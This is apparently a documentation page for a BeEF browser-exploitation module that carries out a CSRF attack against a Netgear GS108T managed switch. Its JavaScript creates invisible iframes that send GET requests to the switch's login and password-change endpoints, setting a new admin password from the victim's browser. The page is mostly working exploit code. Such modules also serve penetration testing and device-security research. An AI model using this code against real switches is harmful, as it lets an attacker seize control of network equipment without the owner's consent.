## Summary

* **Objective**: change the password on a Netgear GS108T managed switch
* **Authors**: Bart Leppens
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/switch/netgear_gs108t_csrf)

## Internal Working

Uses invisible iframe with GET requests to change config.

Note: requires the old password.

```js

  var gs_iframe = beef.dom.createInvisibleIframe();
  gs_login = function()  {
     var d = new Date;
     var rtime = (d.getTime() / 500);
     gs_iframe.setAttribute('src', base+'login.cgi?passwd='+oldpassword+'&rtime='+rtime);
  }

  var gs108t_iframe = beef.dom.createInvisibleIframe();
  gs_change_pwd = function() {
     gs108t_iframe.setAttribute('src', base+'password.cgi?inputBox_oldPassword='+oldpassword+'&inputBox_newPassword='+newpassword+'&inputBox_retypeNewPassword='+newpassword);
  }
```

## Feedback
